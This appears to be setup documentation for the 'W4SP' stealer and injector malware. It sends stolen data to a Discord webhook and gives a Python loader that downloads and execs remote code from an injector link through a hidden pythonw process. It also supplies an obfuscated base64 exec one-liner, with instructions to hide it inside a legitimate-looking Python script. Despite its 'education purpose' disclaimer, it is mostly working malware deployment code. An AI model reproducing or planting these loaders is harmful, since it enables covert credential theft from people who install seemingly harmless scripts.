## Setup [Stealer & Injector]
```sh
1. Put ur webhook in wasp.py: hook = "DISCORD_WEBHOOK"
2. Obfuscate & Upload anywhere (needs to be accessible with an http request)
3. Put wasp.py link in injector.py: request.urlopen("W4SPGRAB").read()
4. Obfuscate it
```
## Setup [Line ~ Optional but recomanded]
```py
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _eexecutable
from os import system as _ssystem
_ttmp = _ffile(delete=False)
_ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen("INJECTOR_LINK").read())""")
_ttmp.close()
try: _ssystem(f"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}")
except: pass

# replace INJECTOR_LINK by the injector.py link from setup
# (this script was made by Billy)
```
```py
# encode in b64 the last payload and replace it here
# then hide this line in a legit looking python script
# or use ur brain and ur own technique, this is just un exemple
# remeber, its for education purpose, attacking a machine w/o autorisation is illegal !

__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("%PAYLOAD%"),'<string>','\x65\x78\x65\x63'))
